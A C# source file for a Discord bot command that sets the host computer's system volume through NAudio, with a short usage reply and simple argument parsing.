using Discord;
using Discord.Commands;
using NAudio.CoreAudioApi;
using System.IO;

namespace Main.Source.Bot.Commands
{
    public class Volume : CommandBase
    {
        public override string Name => "volume";
        public override string Info => "Sets the system volume";
        public override string Use => "Number 1 - 100";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length != 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            if (!int.TryParse(args[0], out int volume))
            {
                volume = 0;
            }

            var device = new MMDeviceEnumerator();
            var endpoint = device.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

            endpoint.AudioEndpointVolume.MasterVolumeLevelScalar = (float)volume / 100;

            await socket.Message.ReplyAsync($"Volume set to {volume}%");
        }
    }
}
